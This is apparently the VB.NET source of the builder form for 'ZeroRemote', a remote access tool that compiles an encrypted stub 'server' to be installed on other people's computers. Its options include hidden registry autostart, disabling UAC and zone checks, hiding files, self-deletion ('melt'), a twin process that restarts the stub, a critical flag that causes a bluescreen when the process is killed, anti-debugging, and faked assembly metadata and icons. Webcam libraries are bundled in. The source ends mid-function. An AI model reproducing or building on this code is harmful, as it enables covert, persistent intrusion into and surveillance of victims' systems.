Imports System.Text
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.IO
Imports System.Threading
Imports System.Linq
Imports Vestris.ResourceLib


Public Class Builder




#Region "Stub Settings"


    Public KeyExchange As String = Seal.GetVariable("StubDecryptionKey")
    Dim VersionResource As VersionResource = New VersionResource


    ' ================== STUB SETTINGS ==================

    Public StubUrl As String = String.Empty
    Public StubFileName As String = String.Empty
    Public StubFolderName As String = String.Empty
    Public StubMutex As String = String.Empty

    Public StubInstall As String = String.Empty
    Public StubAppData As String = String.Empty
    Public StubTemp As String = String.Empty
    Public StubWinDir As String = String.Empty

    Public StubHKCUStartup As String = String.Empty
    Public StubHKLMStartup As String = String.Empty
    Public StubHKCUStartupKey As String = String.Empty
    Public StubHKLMStartupKey As String = String.Empty
    Public StubRunOnce As String = String.Empty

    Public StubElevate As String = String.Empty
    Public StubProcessSecurity As String = String.Empty
    Public StubBlueScreenOnKill As String = String.Empty
    Public StubDisableZonechecks As String = String.Empty
    Public StubProcessPersistance As String = String.Empty
    Public StubDisableUAC As String = String.Empty

    Public StubHiddenAttrib As String = String.Empty
    Public StubMelt As String = String.Empty
    Public StubVisibleMode As String = String.Empty
    Public StubDisableShowHiddenFiles As String = String.Empty

    Public StubIconPath As String = String.Empty
    Public StubTOS As Boolean = False

    Public StubUnkillableProcessExploit As String = String.Empty
    Public StubAntiDllInject As String = String.Empty
    Public StubAntiDebug As String = String.Empty

    Public StubQuerySpeed As String = String.Empty

    Public StubAssemblyTitle As String = String.Empty
    Public StubAssemblyDescription As String = String.Empty
    Public StubAssemblyCompany As String = String.Empty
    Public StubAssemblyProduct As String = String.Empty
    Public StubAssemblyCopyright As String = String.Empty
    Public StubAssemblyTrademark As String = String.Empty
    Public StubAssemblyFileVersion As String = String.Empty

    ' =====================================================


#End Region

#Region "Builder Events / Design Stuff"

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBoxRunOnce.SelectedIndex = 1
    End Sub

    Private Sub ButtonSelectIcon_Click(sender As Object, e As EventArgs) Handles ButtonSelectIcon.Click
        Dim SelectIconDialog As New OpenFileDialog
        SelectIconDialog.Filter = "Icons |*.ico*"
        SelectIconDialog.Title = "Select Icon"
        SelectIconDialog.Multiselect = False
        Try
            If SelectIconDialog.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBoxIcon.Image = Image.FromFile(SelectIconDialog.FileName)
                StubIconPath = SelectIconDialog.FileName
            End If
        Catch ex As Exception
            MsgBox("Icon not found.")
            StubIconPath = String.Empty
        End Try

    End Sub

    Private Sub CheckBoxEnableInstallation_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBoxEnableInstallation.CheckedChanged
        Select Case CheckBoxEnableInstallation.CheckState
            Case CheckState.Checked
                RadioButtonAppData.Checked = True
                RadioButtonAppData.Enabled = True
                RadioButtonTemp.Enabled = True
                RadioButtonWinDir.Enabled = True
                TextBoxHKCU.Enabled = False
                TextBoxHKLM.Enabled = False
                TextBoxInstallFileName.Enabled = True
                TextBoxInstallFolderName.Enabled = True
                CheckBoxHKLM.Enabled = True
                CheckBoxHKCU.Enabled = True
                LabelInstallFileName.Enabled = True
                LabelInstallFolderName.Enabled = True
                LabelRunOnce.Enabled = True
                ComboBoxRunOnce.Enabled = True
                Label3.Enabled = True
            Case CheckState.Unchecked
                RadioButtonAppData.Enabled = False
                RadioButtonTemp.Enabled = False
                RadioButtonWinDir.Enabled = False
                TextBoxInstallFileName.Enabled = False
                TextBoxInstallFolderName.Enabled = False
                LabelInstallFileName.Enabled = False
                LabelInstallFolderName.Enabled = False
                LabelRunOnce.Enabled = False
                ComboBoxRunOnce.Enabled = False
                Label3.Enabled = False
                CheckBoxHKCU.CheckState = CheckState.Unchecked
                CheckBoxHKLM.CheckState = CheckState.Unchecked
                CheckBoxHKLM.Enabled = False
                CheckBoxHKCU.Enabled = False
                TextBoxHKCU.Text = ""
                TextBoxHKLM.Text = ""
                TextBoxHKCU.Enabled = False
                TextBoxHKLM.Enabled = False
        End Select
    End Sub

    Private Function GenerateMutex(ByVal lenght As Integer) As String
        Dim CharSet As String = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim RandomMutex As New StringBuilder
        Dim rnd As New System.Random
        For i As Integer = 0 To lenght
            RandomMutex.Append(CharSet.ElementAt(rnd.Next(1, 36)))
        Next
        Return RandomMutex.ToString
    End Function

    Private Sub ButtonMutex_Click(sender As Object, e As EventArgs) Handles ButtonMutex.Click
        TextBoxMutex.Text = GenerateMutex(20)
    End Sub

    Private Sub LinkLabelTOS_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabelTOS.LinkClicked
        Settings.TabControl1.SelectedIndex = 0
        Settings.ShowDialog()
    End Sub

    Private Sub OptionInfoHover(sender As Object, e As EventArgs) Handles TextBoxURL.MouseHover, CheckBoxEnableInstallation.MouseHover, RadioButtonAppData.MouseHover, RadioButtonTemp.MouseHover, RadioButtonWinDir.MouseHover, CheckBoxElevate.MouseHover, CheckBoxHKCU.MouseHover, TextBoxHKCU.MouseHover, CheckBoxHKLM.MouseHover, TextBoxHKLM.MouseHover, LabelInstallFileName.MouseHover, TextBoxInstallFileName.MouseHover, LabelInstallFolderName.MouseHover, TextBoxInstallFolderName.MouseHover, LabelRunOnce.MouseHover, ComboBoxRunOnce.MouseHover, CheckBoxProcessProtection.MouseHover, CheckBoxBreakOnTermination.MouseHover, CheckBoxDisableZoneChecks.MouseHover, CheckBoxProcessPersistance.MouseHover, CheckBoxDisableUAC.MouseHover, CheckBoxHiddenAttributes.MouseHover, CheckBoxMelt.MouseHover, CheckBoxDisableShowHiddenFiles.MouseHover, CheckBoxVisibleMode.MouseHover, TextBoxMutex.MouseHover, GroupBoxIcon.MouseHover, PictureBox6.MouseHover, LinkLabelTOS.MouseHover, CheckBoxTOS.MouseHover, ButtonSelectIcon.MouseHover, PictureBoxIcon.MouseHover, ButtonAdvanced.MouseHover
        Dim ReturnString As String = ""

        If sender Is TextBoxURL Then
            ReturnString = "Connection URL of ZeroRemote. Requires a 'Zero'-Folder which contains the main.php file."
        ElseIf sender Is CheckBoxEnableInstallation Then
            ReturnString = "Install the ZeroRemote server on the remote computer."
        ElseIf sender Is RadioButtonAppData Then
            ReturnString = "Install the ZeroRemote server in the AppData directory."
        ElseIf sender Is RadioButtonTemp Then
            ReturnString = "Install the ZeroRemote server in the Temp directory."
        ElseIf sender Is RadioButtonWinDir Then
            ReturnString = "Install the ZeroRemote server in the Windows directory. (Requires admin privileges)."
        ElseIf sender Is CheckBoxElevate Then
            ReturnString = "Elevate ZeroRemote server process to admin privileges. On Windows Vista and later the UAC Dialog could show up."
        ElseIf (sender Is TextBoxHKCU) OrElse (sender Is CheckBoxHKCU) Then
            ReturnString = "Autostart ZeroRemote on reboot by using Registry HKEY_CURRENT_USER"
        ElseIf (sender Is TextBoxHKLM) OrElse (sender Is CheckBoxHKLM) Then
            ReturnString = "Autostart ZeroRemote on reboot by using Registry HKEY_LOCAL_MACHINE (Requires admin privileges)"
        ElseIf (sender Is LabelInstallFileName) OrElse (sender Is TextBoxInstallFileName) Then
            ReturnString = "Specify a filename for the server after installation. For example: myserver.exe"
        ElseIf (sender Is LabelInstallFolderName) OrElse (sender Is TextBoxInstallFolderName) Then
            ReturnString = "Specify a name the folder in which the server will copy itself into after the installation."
        ElseIf (sender Is LabelRunOnce) OrElse (sender Is ComboBoxRunOnce) Then
            ReturnString = "Registry RunOnce key make the server startupkey hidden from msconfig. Server will only reboot once!"
        ElseIf sender Is CheckBoxProcessProtection Then
            ReturnString = "Prevent server process from beeing killed with taskmanager by limited users. Admins can still end the process."
        ElseIf sender Is CheckBoxBreakOnTermination Then
            ReturnString = "Apply a critical flag to your ZeroRemote server process. Termination will cause a BlueScreen on the remote system."
        ElseIf sender Is CheckBoxDisableZoneChecks Then
            ReturnString = "The windows zonechecks are for alerting the user of untrusted files and can block execution."
        ElseIf sender Is CheckBoxProcessPersistance Then
            ReturnString = "This feature will initialize a twin process of the ZeroRemote server which will restart the server on termination."
        ElseIf sender Is CheckBoxDisableUAC Then
            ReturnString = "Disables the User Access Control Dialog using Registry. This will only take effect after a reboot of the remote system."
        ElseIf sender Is CheckBoxHiddenAttributes Then
            ReturnString = "Assign hidden attributes to the ZeroRemote server file after execution."
        ElseIf sender Is CheckBoxDisableShowHiddenFiles Then
            ReturnString = "Disables the option to show hidden files in windows explorer."
        ElseIf sender Is CheckBoxMelt Then
            ReturnString = "After installation the server will dissapear from the location it got executed from."
        ElseIf sender Is CheckBoxVisibleMode Then
            ReturnString = "Enables the visible mode. ZeroRemote server will run as a visible console application and every command will be logged."
        ElseIf sender Is TextBoxMutex Then
            ReturnString = "Generates a random mutex to prevent multiple instances of the ZeroRemote server."
        ElseIf (sender Is GroupBoxIcon) OrElse (sender Is ButtonSelectIcon) OrElse (sender Is PictureBoxIcon) Then
            ReturnString = "Select an icon for the compiled server file."
        ElseIf (sender Is LinkLabelTOS) OrElse (sender Is CheckBoxTOS) OrElse (sender Is PictureBox6) Then
            ReturnString = "Accept the Terms of Service in order to build your ZeroRemote server."
        ElseIf sender Is ButtonBuild Then
            ReturnString = "Build your ZeroRemote server binary."
        ElseIf sender Is ButtonAdvanced Then
            ReturnString = "Advanced settings for stronger protection and stealth for your server. Please use these features with caution!"
        End If
        ToolStripStatusLabelOptionInformation.Text = ReturnString
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles ButtonAdvanced.Click
        BuilderAdvancedSettings.Show()
    End Sub

    Private Sub CheckBox5_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBoxHKLM.CheckedChanged
        Select Case CheckBoxHKLM.CheckState
            Case CheckState.Checked
                TextBoxHKLM.Enabled = True
            Case CheckState.Unchecked
                TextBoxHKLM.Enabled = False
        End Select
    End Sub

    Private Sub CheckBoxHKCU_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBoxHKCU.CheckedChanged
        Select Case CheckBoxHKCU.CheckState
            Case CheckState.Checked
                TextBoxHKCU.Enabled = True
            Case CheckState.Unchecked
                TextBoxHKCU.Enabled = False
        End Select
    End Sub

    Private Sub ButtonConnectionSpeed_Click(sender As Object, e As EventArgs) Handles ButtonConnectionSpeed.Click
        BuilderQuerySpeed.Show()
    End Sub

    Private Sub CheckBoxProcessProtection_Click(sender As Object, e As EventArgs) Handles CheckBoxProcessProtection.Click
        If CheckBoxBreakOnTermination.Checked Then
            CheckBoxProcessProtection.Checked = False
            MsgBox("You cannot use this option if the setting ProcessBreakOnTermination is enabled. Disable ProcessBreakOnTermination first to use this option!", MsgBoxStyle.Exclamation, "Process Protection")
        End If
        If CheckBoxProcessPersistance.Checked Then
            CheckBoxProcessPersistance.Checked = False
            MessageBox.Show("It is not possible to use Process Persistance and" & vbNewLine & "Process Protection together.", "Security features", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub CheckBoxProcessPersistance_Click(sender As Object, e As EventArgs) Handles CheckBoxProcessPersistance.Click
        If CheckBoxProcessProtection.Checked Then
            CheckBoxProcessProtection.Checked = False
            MessageBox.Show("It is not possible to use Process Persistance and" & vbNewLine & "Process Protection together.", "Security features", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub


    Private Sub CheckBoxBreakOnTermination_Click(sender As Object, e As EventArgs) Handles CheckBoxBreakOnTermination.Click
        If CheckBoxProcessProtection.Checked Then
            CheckBoxBreakOnTermination.Checked = False
            MsgBox("You cannot use this option if the setting Process Kernel Security is enabled. Disable Process Kernel Security first to use this option!", MsgBoxStyle.Exclamation, "Process Protection")
        End If
        If CheckBoxElevate.Checked = False Then
            CheckBoxBreakOnTermination.Checked = False
            MsgBox("This feature requires elevation." & vbNewLine & "Please enable the elevate on execution feature first.", MsgBoxStyle.Critical, "Elevation needed.")
        End If
    End Sub

    Private Sub ButtonAssemblyInfo_Click(sender As Object, e As EventArgs) Handles ButtonAssemblyInfo.Click
        BuilderAssemblyInformation.ShowDialog()
    End Sub

#End Region

#Region "Build Stub"

    ' Generate a random string
    Function RandomString() As String
        Dim s As String = "abcdefghijklmnopqrstuvwxyzZ0123456789"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 32
            Dim idx As Integer = r.Next(0, 36)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

    ' Notify user if building process has failed
    Private Sub FailedMsgBox(ByVal text As String)
        MessageBox.Show(text, "Build failed", MessageBoxButtons.OK, MessageBoxIcon.Error)
    End Sub

    Private Sub ButtonBuild_Click(sender As Object, e As EventArgs) Handles ButtonBuild.Click



        ' Remove Older Server builts
        If File.Exists("Server.exe") Then
            File.Delete("Server.exe")
        End If

        'Check URL for Zero Directory
        If Not TextBoxURL.Text.ToLower.EndsWith("/zero") Then
            FailedMsgBox("Aborted. No Zero directory.")
            Exit Sub
        End If
        'Check URL for http://
        If Not TextBoxURL.Text.ToLower.StartsWith("http://") Then
            If MessageBox.Show("The url of the server seems to be not valid." & vbNewLine & "Continue anyways?", "Server url", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) = Windows.Forms.DialogResult.No Then
                FailedMsgBox("Aborted. Invalid URL format.")
                Exit Sub
            End If
        End If
        'Check if HKCU startupkey was specified
        If CheckBoxHKCU.Checked AndAlso String.IsNullOrEmpty(TextBoxHKCU.Text) Then
            FailedMsgBox("Aborted. Missing startupkey.")
            Exit Sub
        End If
        'Check if HKLM startupkey was specified
        If CheckBoxHKLM.Checked AndAlso String.IsNullOrEmpty(TextBoxHKLM.Text) Then
            FailedMsgBox("Aborted. Missing startupkey.")
            Exit Sub
        End If
        'Check if a filename has been specified.
        If CheckBoxEnableInstallation.Checked AndAlso String.IsNullOrEmpty(TextBoxInstallFileName.Text) Then
            FailedMsgBox("Aborted. Missing filename.")
            Exit Sub
        End If
        'Check for mutex
        If String.IsNullOrEmpty(TextBoxMutex.Text) Then
            FailedMsgBox("Aborted. Missing mutex.")
            Exit Sub
        End If

        If CheckBoxEnableInstallation.Checked Then
            If Not TextBoxInstallFileName.Text.EndsWith(".exe") Then
                FailedMsgBox("Invalid filename. Please add the '.exe' to the filename.")
                Exit Sub
            End If
        End If

        ' Check if elevation is needed.

        If (RadioButtonWinDir.Checked = True) AndAlso (CheckBoxElevate.Checked = False) Then
            FailedMsgBox("Elevation is needed. Enable the elevation feature.")
            Exit Sub
        ElseIf (CheckBoxBreakOnTermination.Checked = True) AndAlso (CheckBoxElevate.Checked = False) Then
            FailedMsgBox("Elevation is needed. Enable the elevation feature.")
            Exit Sub
        ElseIf (CheckBoxHKLM.Checked = True) AndAlso (CheckBoxElevate.Checked = False) Then
            FailedMsgBox("Elevation is needed. Enable the elevation feature.")
            Exit Sub
        End If

        ' Check Startup is checked on installation
        If CheckBoxEnableInstallation.Checked Then
            If (CheckBoxHKCU.Checked = False) AndAlso (CheckBoxHKLM.Checked = False) Then
                FailedMsgBox("Aborted. Installation requires startup.")
                Exit Sub
            End If
        End If


        'Check if TOS are agreed
        If CheckBoxTOS.Checked = False Then
            FailedMsgBox("Aborted. TOS not accepted.")
            Exit Sub
        End If

        ' Assign settings to stub.

        StubUrl = TextBoxURL.Text
        If CheckBoxElevate.Checked Then
            StubElevate = "True"
        Else
            StubElevate = "False"
        End If
        If CheckBoxEnableInstallation.Checked Then
            StubInstall = "True"
        Else
            StubInstall = "False"
        End If

        If RadioButtonAppData.Checked Then
            StubAppData = "True"
            StubTemp = "False"
            StubWinDir = "False"
        ElseIf RadioButtonTemp.Checked Then
            StubAppData = "False"
            StubTemp = "True"
            StubWinDir = "False"
        ElseIf RadioButtonWinDir.Checked Then
            StubAppData = "False"
            StubTemp = "False"
            StubWinDir = "True"
        Else
            StubAppData = "False"
            StubTemp = "False"
            StubWinDir = "False"
        End If

        If CheckBoxHKCU.Checked Then
            StubHKCUStartup = "True"
        Else
            StubHKCUStartup = "False"
        End If

        If CheckBoxHKLM.Checked Then
            StubHKLMStartup = "True"
        Else
            StubHKLMStartup = "False"
        End If

        StubHKCUStartupKey = TextBoxHKCU.Text
        StubHKLMStartupKey = TextBoxHKLM.Text
        StubFileName = TextBoxInstallFileName.Text
        StubFolderName = TextBoxInstallFolderName.Text

        If ComboBoxRunOnce.SelectedIndex = 0 Then
            StubRunOnce = "True"
        Else
            StubRunOnce = "False"
        End If

        If CheckBoxProcessProtection.Checked Then
            StubProcessSecurity = "True"
        Else
            StubProcessSecurity = "False"
        End If

        If CheckBoxBreakOnTermination.Checked Then
            If Not CheckBoxElevate.Checked Then
                MessageBox.Show("This feature requires elevation. Please check the elevate feature first.", "Elevation needed", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
                Exit Sub
            Else
                StubBlueScreenOnKill = "True"
            End If

        Else
            StubBlueScreenOnKill = "False"
        End If

        If CheckBoxDisableZoneChecks.Checked Then
            StubDisableZonechecks = "True"
        Else
            StubDisableZonechecks = "False"
        End If

        If CheckBoxProcessPersistance.Checked Then
            StubProcessPersistance = "True"
        Else
            StubProcessPersistance = "False"
        End If

        If CheckBoxDisableUAC.Checked Then
            StubDisableUAC = "True"
        Else
            StubDisableUAC = "False"
        End If

        If BuilderAdvancedSettings.CheckBoxAntiDllInjection.Checked Then
            StubAntiDllInject = "True"
        Else
            StubAntiDllInject = "False"
        End If

        If BuilderAdvancedSettings.CheckBoxUnkillableProcessExploit.Checked Then
            StubUnkillableProcessExploit = "True"
        Else
            StubUnkillableProcessExploit = "False"
        End If

        If BuilderAdvancedSettings.CheckBoxAntiDebug.Checked Then
            StubAntiDebug = "True"
        Else
            StubAntiDebug = "False"
        End If

        If StubQuerySpeed = String.Empty Then
            StubQuerySpeed = "3000"
        End If

        StubAssemblyTitle = BuilderAssemblyInformation.TextBoxAssemblyTitle.Text
        StubAssemblyCompany = BuilderAssemblyInformation.TextBoxAssemblyCompany.Text
        StubAssemblyDescription = BuilderAssemblyInformation.TextBoxAssemblyDescription.Text
        StubAssemblyProduct = BuilderAssemblyInformation.TextBoxAssemblyProduct.Text
        StubAssemblyCopyright = BuilderAssemblyInformation.TextBoxAssemblyCopyright.Text
        StubAssemblyTrademark = BuilderAssemblyInformation.TextBoxAssemblyTrademark.Text
        StubAssemblyFileVersion = BuilderAssemblyInformation.TextBoxAssemblyVersion.Text

        If CheckBoxHiddenAttributes.Checked Then
            StubHiddenAttrib = "True"
        Else
            StubHiddenAttrib = "False"
        End If

        If CheckBoxVisibleMode.Checked Then
            StubVisibleMode = "True"
        Else
            StubVisibleMode = "False"
        End If

        If CheckBoxMelt.Checked Then
            StubMelt = "True"
        Else
            StubMelt = "False"
        End If

        If CheckBoxDisableShowHiddenFiles.Checked Then
            StubDisableShowHiddenFiles = "True"
        Else
            StubDisableShowHiddenFiles = "False"
        End If

        StubMutex = TextBoxMutex.Text

        ' Here we will decrypt the stub from the resources, using some cloud variables
        ' Then I loop through all classes until I find this class 'a48617d1a18d4de1980ede14864344f7'
        ' Thats the class which holds the settings.
        ' Then I will check for some specific padding to replace the settings accordingly, by replacing the padding string
        ' with true/false values or strings/numbers like IP and port.

        Try
            Dim Decrypted As String = RC2_Decrypt(My.Resources.stub, AESDecrypt(KeyExchange, "123"))
            Dim AssemblyBytes As AssemblyDefinition = AssemblyDefinition.ReadAssembly(New MemoryStream(Convert.FromBase64String(Decrypted)))
            For Each ModuleDef As ModuleDefinition In AssemblyBytes.Modules
                For Each TypeDef As TypeDefinition In ModuleDef.Types
                    If TypeDef.Name = "a48617d1a18d4de1980ede14864344f7" Then
                        For Each MethodDef As MethodDefinition In TypeDef.Methods
                            If MethodDef.IsConstructor Then
                                For Each Instruct As Instruction In MethodDef.Body.Instructions
                                    If Instruct.OpCode = OpCodes.Ldstr Then
                                        If Not (Instruct.Operand.ToString = "zremote") Then
                                            If Not (Instruct.Operand.ToString = "1.0.0.0") Then
                                                Instruct.Operand = SettingsPatching(Instruct.Operand.ToString)
                                            End If
                                        End If
                                    End If
                                Next
                                For Each VariableDef As VariableDefinition In MethodDef.Body.Variables
                                    VariableDef.Name = RandomString()
                                Next
                            End If
                        Next
                        Exit For

                    End If
                Next
            Next

            ' Assign Visible / Stealthmode

            If StubVisibleMode = "True" Then
                AssemblyBytes.MainModule.Kind = ModuleKind.Console
            ElseIf StubVisibleMode = "False" Then
                AssemblyBytes.MainModule.Kind = ModuleKind.Windows
            Else
                AssemblyBytes.MainModule.Kind = ModuleKind.Windows
            End If

            AssemblyBytes.Write("Server.exe")

            ' Inject Icon

            If Not String.IsNullOrEmpty(StubIconPath) Then
                If File.Exists(StubIconPath) Then
                    IconInjector.InjectIcon("Server.exe", StubIconPath)
                End If
            End If

            ' Update AssemblyInformation

            Try

                VersionResource.LoadFrom("Server.exe")
                Dim stringFileInfo As StringFileInfo = DirectCast(VersionResource("StringFileInfo"), StringFileInfo)

                stringFileInfo("OriginalFilename") = StubAssemblyTitle
                stringFileInfo("FileDescription") = StubAssemblyDescription
                stringFileInfo("CompanyName") = StubAssemblyCompany
                stringFileInfo("ProductName") = StubAssemblyProduct
                stringFileInfo("LegalCopyright") = StubAssemblyCopyright
                stringFileInfo("LegalTrademarks") = StubAssemblyTrademark
                stringFileInfo("FileVersion") = StubAssemblyFileVersion

                VersionResource.SaveTo("Server.exe")


                ' Use ILMerge to embed the aforge dlls which are needed for proper webcam access
                If (IlMergeExists() = True) AndAlso (DependenciesExist() = True) Then
                    Dim cmdProcess As New Process()
                    cmdProcess.StartInfo.WorkingDirectory = Application.StartupPath
                    cmdProcess.StartInfo.FileName = "ILMerge.exe"
                    cmdProcess.StartInfo.Arguments = "Server.exe AForge.Controls.dll AForge.dll AForge.Video.DirectShow.dll AForge.Video.dll /ndebug /targetplatform:v2 /out:Server.exe"
                    cmdProcess.StartInfo.UseShellExecute = False
                    cmdProcess.StartInfo.CreateNoWindow = True
                    cmdProcess.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                    cmdProcess.Start()
                    cmdProcess.WaitForExit()
                Else
                    If File.Exists("Server.exe") Then
                        Try
                            File.Delete("Server.exe")
                        Catch
                        End Try
                    End If
                    MsgBox("Build aborted." & vbNewLine & "ZeroRemote Resourcefiles are missing." & vbNewLine & "Make sure all necessary dlls are in" & vbNewLine & "the same directory as ZeroRemote.", MsgBoxStyle.Critical, "Resources missing")
                    Exit Sub
                End If



            Catch ex As Exception
                TopMost = False
                MsgBox("Assemblyinformation update failed." & vbNewLine & "Please contact the developer." & vbNewLine & ex.Message, MsgBoxStyle.Critical, "Build failed")
                TopMost = True
            End Try
            TopMost = False
            MsgBox("Stub has been created with success.", MsgBoxStyle.Information, "Build finished")
            TopMost = True

        Catch ex3 As AccessViolationException
            TopMost = False
            MsgBox("Building Server failed." & vbNewLine & "Access violation. File in use?" & vbNewLine & ex3.Message, MsgBoxStyle.Critical, "Build failed")
            TopMost = True

        Catch ex2 As FileNotFoundException
            TopMost = False
            MsgBox("Building Server failed." & vbNewLine & "File not found." & vbNewLine & ex2.Message, MsgBoxStyle.Critical, "Build failed")
            TopMost = True
        Catch ex As Exception
            TopMost = False
            MsgBox("Building Server failed." & vbNewLine & "Please contact the developer." & vbNewLine & ex.Message, MsgBoxStyle.Critical, "Build failed")
            TopMost = True


        End Try

    End Sub


    Private Function IlMergeExists() As Boolean
        If Not File.Exists(Application.StartupPath & "\ILMerge.exe") Then
            Return False
        Else
            Return True
        End If

    End Function

    Private Function DependenciesExist() As Boolean
        If Not File.Exists(Application.StartupPath & "\AForge.Controls.dll") Or _
                   Not File.Exists(Application.StartupPath & "\AForge.dll") Or _
                   Not File.Exists(Application.StartupPath & "\AForge.Video.DirectShow.dll") Or _
                   Not File.Exists(Application.StartupPath & "\AForge.Video.dll") Or _
                   Not File.Exists(Application.StartupPath & "\Mono.Cecil.dll") Or _
                   Not File.Exists(Application.StartupPath & "\Vestris.ResourceLib.dll") Then

            Return False
        Else
            Return True
        End If
    End Function


    ' Check if the input is a padding string, so it can be replaced with stub settings.
    ' Stub Settings are also encrypted again after they have been replaced to make
    ' the reversign of the built stub a lot harder.
    Private Function SettingsPatching(ByVal Operand As String) As String
        Select Case Operand
            Case "###HOST###"
                Return AESEncrypt(StubUrl, "zremote")
            Case "###Mutex###"
                Return RC4(StubMutex)
            Case "###StubInstall###"
                Return RC4(StubInstall)
            Case "###StubAppData###"
                Return RC4(StubAppData)
            Case "###StubTemp###"
                Return RC4(StubTemp)
            Case "###StubWinDir###"
                Return RC4(StubWinDir)
            Case "###Filename###"
                Return RC4(StubFileName)
            Case "###Foldername###"
                Return RC4(StubFolderName)
            Case "###StartupHKCU###"
                Return RC4(StubHKCUStartup)
            Case "###StartupHKLM###"
                Return RC4(StubHKLMStartup)
            Case "###HKCUKeyName###"
                Return RC4(StubHKCUStartupKey)
            Case "###HKLMKeyName###"
                Return RC4(StubHKLMStartupKey)
            Case "###RunOnce###"
                Return RC4(StubRunOnce)
            Case "###Elevate###"
                Return RC4(StubElevate)
            Case "###ProcessSecurity###"
                Return RC4(StubProcessSecurity)
            Case "###BreakOnTermination###"
                Return RC4(StubElevate)
            Case "###DisableZonecheck###"
                Return RC4(StubDisableZonechecks)
            Case "###TwinProcess###"
                Return RC4(StubProcessPersistance)
            Case "###DisableUAC###"
                Return RC4(StubDisableUAC)
            Case "###HiddenAttrib###"
                Return RC4(StubHiddenAttrib)
            Case "###Melt###"
                Return RC4(StubMelt)
            Case "###VisibleMode###"
                Return RC4(StubVisibleMode)
            Case "###DisableshowHiddenFiles###"
                Return RC4(StubDisableShowHiddenFiles)
            Case "###UnkillableProcessExploit###"
                Return RC4(StubUnkillableProcessExploit)
            Case "###AntiDllInject###"
                Return RC4(StubAntiDllInject)
            Case "###AntiDebug###"
                Return RC4(StubAntiDebug)
            Case "###QuerySpeed###"
                Return RC4(StubQuerySpeed)
            Case Else
                Return RC4("Exception")
        End Select
    End Function

#End Region

#Region "Encryption"


    Public Function AESDecrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
            Return ""
        End Try
    End Function

    Public Function RC2_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim RC2 As New System.Security.Cryptography.RC2CryptoServiceProvider
        Dim Hash_RC2 As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash() As Byte = Hash_RC2.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))

            RC2.Key = hash
            RC2.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = RC2.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Function AESEncrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Public Function RC2_Decrypt(ByVal input As String, ByVal pass As String) As String
        Dim RC2 As New System.Security.Cryptography.RC2CryptoServiceProvider
        Dim Hash_RC2 As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Try
            Dim hash() As Byte = Hash_RC2.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            RC2.Key = hash
            RC2.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = RC2.CreateDecryptor
            Dim Buffer As Byte() = Convert.FromBase64String(input)
            decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function


    Dim Pass As String = "SecureZRSettings"


    Private Function RC4(ByVal message As String) As String
        Dim s = Enumerable.Range(0, 256).ToArray
        Dim i, j As Integer
        For i = 0 To s.Length - 1
            j = (j + Asc(Pass(i Mod Pass.Length)) + s(i)) And 255
            Dim temp = s(i)
            s(i) = s(j)
            s(j) = temp
        Next
        i = 0
        j = 0
        Dim sb As New StringBuilder(message.Length)
        For Each c As Char In message
